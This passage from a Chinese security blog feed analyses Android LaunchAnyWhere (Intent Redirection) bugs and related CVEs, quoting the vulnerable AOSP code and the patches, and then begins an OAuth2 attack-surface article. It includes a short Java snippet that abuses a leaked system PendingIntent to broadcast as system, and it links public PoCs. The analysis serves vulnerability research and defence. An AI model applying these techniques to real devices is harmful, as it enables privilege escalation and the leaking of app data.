&lt;li&gt;&lt;a href=&quot;https://stackoverflow.com/questions/17823225/do-arraybuffers-have-a-maximum-length&quot;&gt;javascript - Do ArrayBuffers have a maximum length? - Stack Overflow&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content:encoded></item><item><title>LaunchAnyWhere漏洞分析</title><link>https://picoorg.github.io/posts/launchanywhere/</link><guid isPermaLink="true">https://picoorg.github.io/posts/launchanywhere/</guid><description>本文主要针对LaunchAnyWhere类型漏洞进行整理分析，最终形成一些静态分析规则形式的总结。</description><pubDate>Tue, 28 May 2024 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1-%E6%A6%82%E8%BF%B0&quot;&gt;1. 概述&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#2-%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0&quot;&gt;2. 漏洞成因&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#21-google-bug-7699048&quot;&gt;2.1. Google Bug 7699048&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#22-google-bug-17356824&quot;&gt;2.2. Google Bug 17356824&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#23-cve-2020-0144&quot;&gt;2.3. CVE-2020-0144&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#24-cve-2021-39707&quot;&gt;2.4. CVE-2021-39707&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#25-cve-2022-20223&quot;&gt;2.5. CVE-2022-20223&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#3-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8&quot;&gt;3. 漏洞利用&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#31-launch-a-component&quot;&gt;3.1. launch a component&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#32-return-data&quot;&gt;3.2. return data&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#4-%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0&quot;&gt;4. 参考文章&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;1. 概述&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;LaunchAnyWhere&lt;/code&gt;漏洞比较早的分析可以参考&lt;a href=&quot;http://retme.net/index.php/2014/08/20/launchAnyWhere.html&quot;&gt;retme的文章&lt;/a&gt;，后来Google给这种漏洞命名为&lt;a href=&quot;https://support.google.com/faqs/answer/9267555&quot;&gt;Intent Redirection&lt;/a&gt;。&lt;code&gt;LaunchAnyWhere&lt;/code&gt;顾名思义就是能够调用任意未导出的&lt;code&gt;Activity&lt;/code&gt;。&lt;/p&gt;
&lt;h1&gt;2. 漏洞成因&lt;/h1&gt;
&lt;h2&gt;2.1. &lt;a href=&quot;https://android.googlesource.com/platform/frameworks/base/+/5bab9da%5E%21/&quot;&gt;Google Bug 7699048&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;AccountManagerService&lt;/code&gt;是系统服务之一，暴露给开发者的的接口是&lt;code&gt;AccountManager&lt;/code&gt;。该服务用于管理用户各种网络账号。这使得一些应用可以获取用户网络账号的&lt;code&gt;token&lt;/code&gt;，并且使用&lt;code&gt;token&lt;/code&gt;调用一些网络服务。这种设计的本意是，&lt;code&gt;AccountManagerService&lt;/code&gt;帮助&lt;code&gt;AppA&lt;/code&gt;查找到&lt;code&gt;AppB&lt;/code&gt;账号登陆页面，并呼起这个登陆页面。而问题在于，&lt;code&gt;AppB&lt;/code&gt;可以任意指定这个&lt;code&gt;intent&lt;/code&gt;所指向的组件，&lt;code&gt;AppA&lt;/code&gt;将在不知情的情况下由&lt;code&gt;AccountManagerResponse&lt;/code&gt;调用起了一个&lt;code&gt;Activity&lt;/code&gt;。如果&lt;code&gt;AppA&lt;/code&gt;是一个system权限应用，比如Settings，那么&lt;code&gt;AppA&lt;/code&gt;能够调用起任意&lt;code&gt;AppB&lt;/code&gt;指定的未导出&lt;code&gt;Activity&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./20140820063530_23346.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;此漏洞比较经典的流程图，当&lt;code&gt;AppA&lt;/code&gt;是&lt;code&gt;Settings&lt;/code&gt;，可以简单理解成以下流程：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;AppB&lt;/code&gt;调用&lt;code&gt;com.android.settings.accounts.AddAccountSettings&lt;/code&gt;，使Settings请求添加一个特定类型的网络账号&lt;/li&gt;
&lt;li&gt;系统查询到&lt;code&gt;AppB&lt;/code&gt;可以提供一个该类型的网络账号服务，系统向&lt;code&gt;AppB&lt;/code&gt;发起请求&lt;/li&gt;
&lt;li&gt;&lt;code&gt;AppB&lt;/code&gt;返回了一个&lt;code&gt;intent&lt;/code&gt;给系统，系统把&lt;code&gt;intent&lt;/code&gt;转发给&lt;code&gt;Settings&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;AccountManagerResponse&lt;/code&gt;在Settings的进程空间内调用&lt;code&gt;startActivity(intent)&lt;/code&gt;调起一个&lt;code&gt;Activity&lt;/code&gt;，&lt;code&gt;AccountManagerResponse&lt;/code&gt;是&lt;code&gt;FrameWork&lt;/code&gt;中的代码，&lt;code&gt;AppA&lt;/code&gt;对这一调用毫不知情。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;最终关键触发点在此处&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/** Handles the responses from the AccountManager */
private class Response extends IAccountManagerResponse.Stub {
    public void onResult(Bundle bundle) {
        Intent intent = bundle.getParcelable(KEY_INTENT);
        if (intent != null &amp;amp;&amp;amp; mActivity != null) {
          // since the user provided an Activity we will silently start intents
          // that we see
          mActivity.startActivity(intent);
            // leave the Future running to wait for the real response to this request
            } else if (bundle.getBoolean(&quot;retry&quot;)) {
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;a href=&quot;https://android.googlesource.com/platform/frameworks/base/+/5bab9da%5E%21/#F0&quot;&gt;安卓4.4&lt;/a&gt;已经修复了这个漏洞，检查了Step3中返回的&lt;code&gt;intent&lt;/code&gt;所指向的&lt;code&gt;Activity&lt;/code&gt;和&lt;code&gt;AppB&lt;/code&gt;是否是有相同签名的。避免了&lt;code&gt;LaunchAnyWhere&lt;/code&gt;的可能。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;+        @Override
         public void onResult(Bundle result) {
             mNumResults++;
-            if (result != null &amp;amp;&amp;amp; !TextUtils.isEmpty(result.getString(AccountManager.KEY_AUTHTOKEN))) {
+            Intent intent = null;
+            if (result != null
+                    &amp;amp;&amp;amp; (intent = result.getParcelable(AccountManager.KEY_INTENT)) != null) {
+                /*
+                 * The Authenticator API allows third party authenticators to
+                 * supply arbitrary intents to other apps that they can run,
+                 * this can be very bad when those apps are in the system like
+                 * the System Settings.
+                 */
+                PackageManager pm = mContext.getPackageManager();
+                ResolveInfo resolveInfo = pm.resolveActivity(intent, 0);
+                int targetUid = resolveInfo.activityInfo.applicationInfo.uid;
+                int authenticatorUid = Binder.getCallingUid();
+                if (PackageManager.SIGNATURE_MATCH !=
+                        pm.checkSignatures(authenticatorUid, targetUid)) {
+                    throw new SecurityException(
+                            &quot;Activity to be started with KEY_INTENT must &quot; +
+                            &quot;share Authenticator&apos;s signatures&quot;);
+                }
+            }
+            if (result != null
+                    &amp;amp;&amp;amp; !TextUtils.isEmpty(result.getString(AccountManager.KEY_AUTHTOKEN))) {
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;2.2. Google Bug 17356824&lt;/h2&gt;
&lt;p&gt;和&lt;a href=&quot;#google-bug-7699048&quot;&gt;Google Bug 7699048&lt;/a&gt;是同一个流程，但不同的是漏洞成因不同，这次是&lt;code&gt;Settings&lt;/code&gt;调用了&lt;code&gt;AccountManager.addAccount&lt;/code&gt;。在传递的&lt;code&gt;AddAccountOptions&lt;/code&gt;参数时加入了一个&lt;code&gt;PendingIntent&lt;/code&gt;，其&lt;code&gt;intent&lt;/code&gt;类型是&lt;code&gt;Broadcast&lt;/code&gt;。注意这个&lt;code&gt;PendingIntent&lt;/code&gt;是&lt;code&gt;Settings&lt;/code&gt;创建的，拥有system权限。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;     private void addAccount(String accountType) {
         Bundle addAccountOptions = new Bundle();
         mPendingIntent = PendingIntent.getBroadcast(this, 0, new Intent(), 0);
         addAccountOptions.putParcelable(KEY_CALLER_IDENTITY, mPendingIntent);
         addAccountOptions.putBoolean(EXTRA_HAS_MULTIPLE_USERS, Utils.hasMultipleUsers(this));
         AccountManager.get(this).addAccount(
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;因为&lt;code&gt;Settings&lt;/code&gt;初始化&lt;code&gt;PendingIntent&lt;/code&gt;的时候传入的是一个没有内容的&lt;code&gt;new Intent()&lt;/code&gt;，所以攻击者在调用&lt;code&gt;PendingIntent.send()&lt;/code&gt;的时候可以随意设置&lt;code&gt;Intent&lt;/code&gt;中的大部分内容。这是由于在系统源码中&lt;code&gt;PendingIntentRecord.sendInner&lt;/code&gt;调用了&lt;code&gt;finalIntent.fillIn(intent, key.flags)&lt;/code&gt;，允许调用者填充&lt;code&gt;Intent&lt;/code&gt;的值。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;    int sendInner(int code, Intent intent, String resolvedType,
            IIntentReceiver finishedReceiver, String requiredPermission,
            IBinder resultTo, String resultWho, int requestCode,
            int flagsMask, int flagsValues, Bundle options) {
        synchronized(owner) {
            if (!canceled) {
                sent = true;
                if ((key.flags&amp;amp;PendingIntent.FLAG_ONE_SHOT) != 0) {
                    owner.cancelIntentSenderLocked(this, true);
                    canceled = true;
                }
                Intent finalIntent = key.requestIntent != null
                        ? new Intent(key.requestIntent) : new Intent();
                if (intent != null) {
                    int changes = finalIntent.fillIn(intent, key.flags);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;因此只要AppB在step3的时候取到了AddAccountOptions参数，从中获得了这个PendingIntent，并且可以利用它以system的身份发送广播，示例代码如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;PendingIntent pending_intent = (PendingIntent)options.get(&quot;pendingIntent&quot;);
intent.setAction(&quot;android.intent.action.BOOT_COMPLETED&quot;);
 
try {
         pending_intent.send(getGlobalApplicationContext(),0,intent,null,null,null);
} catch (CanceledException e) {
         e.printStackTrace();
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在此&lt;a href=&quot;https://android.googlesource.com/platform/packages/apps/Settings/+/37b58a4%5E%21/#F0&quot;&gt;补丁&lt;/a&gt;中填充了无意义的值，防止攻击者重新填充Intent&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;     private void addAccount(String accountType) {
         Bundle addAccountOptions = new Bundle();
-        mPendingIntent = PendingIntent.getBroadcast(this, 0, new Intent(), 0);
+        /*
+         * The identityIntent is for the purposes of establishing the identity
+         * of the caller and isn&apos;t intended for launching activities, services
+         * or broadcasts.
+         *
+         * Unfortunately for legacy reasons we still need to support this. But
+         * we can cripple the intent so that 3rd party authenticators can&apos;t
+         * fill in addressing information and launch arbitrary actions.
+         */
+        Intent identityIntent = new Intent();
+        identityIntent.setComponent(new ComponentName(SHOULD_NOT_RESOLVE, SHOULD_NOT_RESOLVE));
+        identityIntent.setAction(SHOULD_NOT_RESOLVE);
+        identityIntent.addCategory(SHOULD_NOT_RESOLVE);
+
+        mPendingIntent = PendingIntent.getBroadcast(this, 0, identityIntent, 0);
         addAccountOptions.putParcelable(KEY_CALLER_IDENTITY, mPendingIntent);
         addAccountOptions.putBoolean(EXTRA_HAS_MULTIPLE_USERS, Utils.hasMultipleUsers(this));
         AccountManager.get(this).addAccount(
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;2.3. &lt;a href=&quot;https://source.android.com/docs/security/bulletin/2020-06-01&quot;&gt;CVE-2020-0144&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;SliceProvider&lt;/code&gt;是自&lt;code&gt;Android P&lt;/code&gt;开始引入的一种应用程序间共享UI界面的机制，可以通过&lt;code&gt;SettingsSliceProvider&lt;/code&gt;中的&lt;code&gt;ContentProvider&lt;/code&gt;来共享给别的应用使用，用户不必打开&lt;code&gt;Settings&lt;/code&gt;，就可以在其他应用界面中对某些设置进行操作。&lt;/p&gt;
&lt;p&gt;关键漏洞位置在&lt;code&gt;frameworks/base/packages/SystemUI/src/com/android/systemui/keyguard/KeyguardSliceProvider.java&lt;/code&gt;生成了一个无&lt;code&gt;Package&lt;/code&gt;和&lt;code&gt;Action&lt;/code&gt;的&lt;code&gt;PendingIntent&lt;/code&gt;，具体代码如下&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public boolean onCreateSliceProvider() {
            ...
            mPendingIntent = PendingIntent.getActivity(getContext(), 0, new Intent(), 0);
            ...
        }
return true;
    }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;接下来通过父类&lt;code&gt;SliceProvider&lt;/code&gt;的&lt;code&gt;call&lt;/code&gt;方法返回包含该&lt;code&gt;Intent&lt;/code&gt;的&lt;code&gt;Bundle&lt;/code&gt;，具体代码如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;@Override
    public Bundle call(String method, String arg, Bundle extras) {
        if (method.equals(METHOD_SLICE)) {
            Uri uri = getUriWithoutUserId(validateIncomingUriOrNull(
                    extras.getParcelable(EXTRA_BIND_URI)));
            List&amp;lt;SliceSpec&amp;gt; supportedSpecs = extras.getParcelableArrayList(EXTRA_SUPPORTED_SPECS);

            String callingPackage = getCallingPackage();
            int callingUid = Binder.getCallingUid();
            int callingPid = Binder.getCallingPid();

            Slice s = handleBindSlice(uri, supportedSpecs, callingPackage, callingUid, callingPid);
            Bundle b = new Bundle();
            b.putParcelable(EXTRA_SLICE, s);
            return b;
        } else if (method.equals(METHOD_MAP_INTENT)) {
            ...
        } else if (method.equals(METHOD_MAP_ONLY_INTENT)) {
            ...
        } else if (method.equals(METHOD_PIN)) {
            ...
        } else if (method.equals(METHOD_UNPIN)) {
            ...
        } else if (method.equals(METHOD_GET_DESCENDANTS)) {
            ...
        } else if (method.equals(METHOD_GET_PERMISSIONS)) {
            ...
        }
        return super.call(method, arg, extras);
    }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;难点在于如何拿到这个&lt;code&gt;PendingIntent&lt;/code&gt;，具体思路可以参考文章&lt;a href=&quot;https://paper.seebug.org/1269/#0x04-keyguardsliceprovider&quot;&gt;Android 中的特殊攻击面（三）—— 隐蔽的 call 函数&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;该漏洞&lt;a href=&quot;https://android.googlesource.com/platform/frameworks/base/+/d16e86f466c2fc18448b654cbe71089c7fede991%5E%21/#F0&quot;&gt;补丁&lt;/a&gt;相当于指定了Package，细节如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;             mZenModeController = new ZenModeControllerImpl(getContext(), mHandler);
             mZenModeController.addCallback(this);
             mDatePattern = getContext().getString(R.string.system_ui_aod_date_pattern);
-            mPendingIntent = PendingIntent.getActivity(getContext(), 0, new Intent(), 0);
+            mPendingIntent = PendingIntent.getActivity(getContext(), 0,
+                    new Intent(getContext(), KeyguardSliceProvider.class), 0);
             mMediaWakeLock = new SettableWakeLock(WakeLock.createPartial(getContext(), &quot;media&quot;),
                     &quot;media&quot;);
             KeyguardSliceProvider.sInstance = this;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;同样也有公开&lt;a href=&quot;https://github.com/tea9/CVE-2020-0114-systemui&quot;&gt;POC&lt;/a&gt;可以参考。&lt;/p&gt;
&lt;h2&gt;2.4. &lt;a href=&quot;https://source.android.com/docs/security/bulletin/2022-03-01&quot;&gt;CVE-2021-39707&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;最终漏洞触发位置在&lt;code&gt;com/android/settings/users/AppRestrictionsFragment.java&lt;/code&gt;，&lt;a href=&quot;https://android.googlesource.com/platform/packages/apps/Settings/+/refs/tags/android-12.0.0_r30/src/com/android/settings/users/AppRestrictionsFragment.java#630&quot;&gt;相关代码&lt;/a&gt;为：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public void onReceive(Context context, Intent intent) {
    Bundle results = getResultExtras(true);
    final ArrayList&amp;lt;RestrictionEntry&amp;gt; restrictions = results.getParcelableArrayList(
            Intent.EXTRA_RESTRICTIONS_LIST);
    Intent restrictionsIntent = results.getParcelable(CUSTOM_RESTRICTIONS_INTENT);
    if (restrictions != null &amp;amp;&amp;amp; restrictionsIntent == null) {
        onRestrictionsReceived(preference, restrictions);
        if (mRestrictedProfile) {
            mUserManager.setApplicationRestrictions(packageName,
                    RestrictionsManager.convertRestrictionsToBundle(restrictions), mUser);
        }
    } else if (restrictionsIntent != null) {
        preference.setRestrictions(restrictions);
        if (invokeIfCustom &amp;amp;&amp;amp; AppRestrictionsFragment.this.isResumed()) {
            assertSafeToStartCustomActivity(restrictionsIntent);
            int requestCode = generateCustomActivityRequestCode(
                    RestrictionsResultReceiver.this.preference);
            AppRestrictionsFragment.this.startActivityForResult(
                    restrictionsIntent, requestCode);
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;此漏洞是&lt;code&gt;assertSafeToStartCustomActivity&lt;/code&gt;校验不足产生的，相关代码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;private void assertSafeToStartCustomActivity(Intent intent) {
    // Activity can be started if it belongs to the same app
    if (intent.getPackage() != null &amp;amp;&amp;amp; intent.getPackage().equals(packageName)) {
        return;
    }
    // Activity can be started if intent resolves to multiple activities
    List&amp;lt;ResolveInfo&amp;gt; resolveInfos = AppRestrictionsFragment.this.mPackageManager
            .queryIntentActivities(intent, 0 /* no flags */);
    if (resolveInfos.size() != 1) {
        return;
    }
    // Prevent potential privilege escalation
    ActivityInfo activityInfo = resolveInfos.get(0).activityInfo;
    if (!packageName.equals(activityInfo.packageName)) {
        throw new SecurityException(&quot;Application &quot; + packageName
                + &quot; is not allowed to start activity &quot; + intent);
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;其中，正常情况下&lt;code&gt;resolveInfos.size() != 1&lt;/code&gt;可筛选出&lt;code&gt;Intent&lt;/code&gt;为多个目标的情况，触发用户选择的流程从而防止漏洞触发。但是&lt;code&gt;Activity&lt;/code&gt;在&lt;code&gt;Manifest&lt;/code&gt;中有一个配置叫做&lt;code&gt;android:priority&lt;/code&gt;，如果其中存在高优先级的Activity则会被直接选择，并不会触发用户选择的流程。但刚好&lt;code&gt;PrivilegedCallActivity&lt;/code&gt;符合利用场景，相关漏洞利用参考&lt;a href=&quot;https://www.freebuf.com/articles/mobile/348694.html&quot;&gt;CVE的别样发现之旅 | AOSP Bug Hunting with appshark&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;最终官方给出的&lt;a href=&quot;https://android.googlesource.com/platform/packages/apps/Settings/+/4fb753d22e6a2505b1667950d153bc03ad8ae422%5E%21/&quot;&gt;补丁&lt;/a&gt;代码如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;             if (intent.getPackage() != null &amp;amp;&amp;amp; intent.getPackage().equals(packageName)) {
                 return;
             }
-            // Activity can be started if intent resolves to multiple activities
-            List&amp;lt;ResolveInfo&amp;gt; resolveInfos = AppRestrictionsFragment.this.mPackageManager
-                    .queryIntentActivities(intent, 0 /* no flags */);
-            if (resolveInfos.size() != 1) {
-                return;
+            ResolveInfo resolveInfo = mPackageManager.resolveActivity(
+                    intent, PackageManager.MATCH_DEFAULT_ONLY);
+
+            if (resolveInfo == null) {
+                throw new ActivityNotFoundException(&quot;No result for resolving &quot; + intent);
             }
             // Prevent potential privilege escalation
-            ActivityInfo activityInfo = resolveInfos.get(0).activityInfo;
+            ActivityInfo activityInfo = resolveInfo.activityInfo;
             if (!packageName.equals(activityInfo.packageName)) {
                 throw new SecurityException(&quot;Application &quot; + packageName
                         + &quot; is not allowed to start activity &quot; + intent);
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;2.5. &lt;a href=&quot;https://source.android.com/docs/security/bulletin/2022-07-01&quot;&gt;CVE-2022-20223&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;漏洞利用流程和&lt;a href=&quot;#cve-2021-39707&quot;&gt;CVE-2021-39707&lt;/a&gt;类似，只不过是校验函数的二次绕过。&lt;/p&gt;
&lt;p&gt;由于&lt;code&gt;intent.getPackage()&lt;/code&gt;和&lt;code&gt;getPackageManager().resolveActivity(intent, PackageManager.MATCH_DEFAULT_ONLY).activityInfo.packageName&lt;/code&gt;获得packageName逻辑不一致，导致校验不足。其中&lt;code&gt;intent.getPackage()&lt;/code&gt;是针对&lt;code&gt;private String mPackage;&lt;/code&gt;，而&lt;code&gt;resolve&lt;/code&gt;方式是如果存在&lt;code&gt;private ComponentName mComponent;&lt;/code&gt;则取该值，否则取&lt;code&gt;mPackage&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;对应的&lt;a href=&quot;https://android.googlesource.com/platform/packages/apps/Settings/+/abadb382114fa8af5209295c9bae2ca2b08935f3%5E%21/#F0&quot;&gt;修复补丁&lt;/a&gt;也比较简单，代码如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;         private void assertSafeToStartCustomActivity(Intent intent) {
-            // Activity can be started if it belongs to the same app
-            if (intent.getPackage() != null &amp;amp;&amp;amp; intent.getPackage().equals(packageName)) {
-                return;
-            }
+            EventLog.writeEvent(0x534e4554, &quot;223578534&quot;, -1 /* UID */, &quot;&quot;);
             ResolveInfo resolveInfo = mPackageManager.resolveActivity(
                     intent, PackageManager.MATCH_DEFAULT_ONLY);
&lt;/code&gt;&lt;/pre&gt;
&lt;h1&gt;3. 漏洞利用&lt;/h1&gt;
&lt;h2&gt;3.1. launch a component&lt;/h2&gt;
&lt;p&gt;调用&lt;code&gt;startActivity&lt;/code&gt;, &lt;code&gt;startActivityForResult&lt;/code&gt;, &lt;code&gt;startService&lt;/code&gt;, &lt;code&gt;sendBroadcast&lt;/code&gt;时使用不可信的&lt;code&gt;intent&lt;/code&gt;，可能导致唤起私有的&lt;code&gt;Activity&lt;/code&gt;&lt;/p&gt;
&lt;h2&gt;3.2. return data&lt;/h2&gt;
&lt;p&gt;调用&lt;code&gt;setResult&lt;/code&gt;时使用不可信的&lt;code&gt;intent&lt;/code&gt;，可能导致&lt;code&gt;app&lt;/code&gt;隐私数据泄露&lt;/p&gt;
&lt;h1&gt;4. 参考文章&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://retme.net/index.php/2014/08/20/launchAnyWhere.html&quot;&gt;launchAnyWhere: Activity组件权限绕过漏洞解析(Google Bug 7699048 )&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.freebuf.com/articles/mobile/348694.html&quot;&gt;CVE的别样发现之旅 | AOSP Bug Hunting with appshark (1): I... - FreeBuf网络安全行业门户&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://blog.lleavesg.top/article/LaunchAnyWhere&quot;&gt;LaunchAnyWhere漏洞分析&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://paper.seebug.org/1269/&quot;&gt;Android 中的特殊攻击面（三）—— 隐蔽的 call 函数&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://retme.net/index.php/2014/11/14/broadAnywhere-bug-17356824.html&quot;&gt;broadAnywhere：Broadcast组件权限绕过漏洞（Bug: 17356824）&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content:encoded></item><item><title>OAuth2攻击面分析</title><link>https://picoorg.github.io/posts/oauth2%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/</link><guid isPermaLink="true">https://picoorg.github.io/posts/oauth2%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/</guid><description>本文主要梳理OAuth2常见攻击手段，并且结合实际案例进行分析。</description><pubDate>Tue, 07 May 2024 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1-%E5%89%8D%E8%A8%80&quot;&gt;1. 前言&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#11-oauth-10%E6%BC%8F%E6%B4%9Esession-fixation-attack%E5%88%86%E6%9E%90&quot;&gt;1.1. OAuth 1.0漏洞(Session Fixation Attack)分析&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#2-%E4%BB%80%E4%B9%88%E6%98%AFoauth2&quot;&gt;2. 什么是OAuth2&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#21-%E8%A7%92%E8%89%B2&quot;&gt;2.1. 角色&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#22-%E5%8D%8F%E8%AE%AE%E6%B5%81%E7%A8%8B&quot;&gt;2.2. 协议流程&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#23-%E6%8E%88%E6%9D%83%E6%A8%A1%E5%BC%8F&quot;&gt;2.3. 授权模式&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#231-%E6%8E%88%E6%9D%83%E7%A0%81%E6%A8%A1%E5%BC%8Fauthorization-code&quot;&gt;2.3.1. 授权码模式(Authorization Code)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#232-%E6%8E%88%E6%9D%83%E7%A0%81pkce%E6%A8%A1%E5%BC%8Fauthorization-code-with-pkce&quot;&gt;2.3.2. 授权码+PKCE模式(Authorization Code with PKCE)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#233-%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%87%AD%E8%AF%81%E6%A8%A1%E5%BC%8Fclient-credentials&quot;&gt;2.3.3. 客户端凭证模式(Client Credentials)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#234-%E7%94%A8%E6%88%B7%E5%87%AD%E8%AF%81%E6%A8%A1%E5%BC%8Fresource-owner-password-credentials-%E4%B8%8D%E5%AE%89%E5%85%A8&quot;&gt;2.3.4. 用户凭证模式(Resource Owner Password Credentials) 不安全&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#235-%E9%9A%90%E5%BC%8F%E6%8E%88%E6%9D%83%E6%A8%A1%E5%BC%8Fimplicit-%E4%B8%8D%E5%AE%89%E5%85%A8&quot;&gt;2.3.5. 隐式授权模式(Implicit) 不安全&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#236-%E8%AE%BE%E5%A4%87%E4%BB%A3%E7%A0%81%E6%A8%A1%E5%BC%8Fdevice-code-%E6%9E%81%E5%A4%A7%E6%A6%82%E7%8E%87%E5%AD%98%E5%9C%A8session-fixation-attack%E6%BC%8F%E6%B4%9E&quot;&gt;2.3.6. 设备代码模式(Device Code) 极大概率存在Session Fixation Attack漏洞&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#24-oidc&quot;&gt;2.4. OIDC&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#3-oauth2%E6%94%BB%E5%87%BB%E9%9D%A2&quot;&gt;3. OAuth2攻击面&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#31-csrf%E5%AF%BC%E8%87%B4%E7%BB%91%E5%AE%9A%E5%8A%AB%E6%8C%81&quot;&gt;3.1. CSRF导致绑定劫持&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#32-redirect_uri%E7%BB%95%E8%BF%87%E5%AF%BC%E8%87%B4%E6%8E%88%E6%9D%83%E5%8A%AB%E6%8C%81&quot;&gt;3.2. redirect_uri绕过导致授权劫持&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#33-scope%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE&quot;&gt;3.3. scope越权访问&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#4-%E5%90%8D%E8%AF%8D%E8%A7%A3%E9%87%8A&quot;&gt;4. 名词解释&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#5-%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99&quot;&gt;5. 参考资料&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;1. 前言&lt;/h1&gt;
&lt;p&gt;随着大量开放平台的出现，建立在开放平台之上的各种第三方应用也在大量涌现，出于对安全性和统一标准的要求，诞生了oauth协议。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.rfc-editor.org/rfc/rfc5849&quot;&gt;OAuth 1.0&lt;/a&gt;于2007年推出后迅速被广泛使用。&lt;/p&gt;
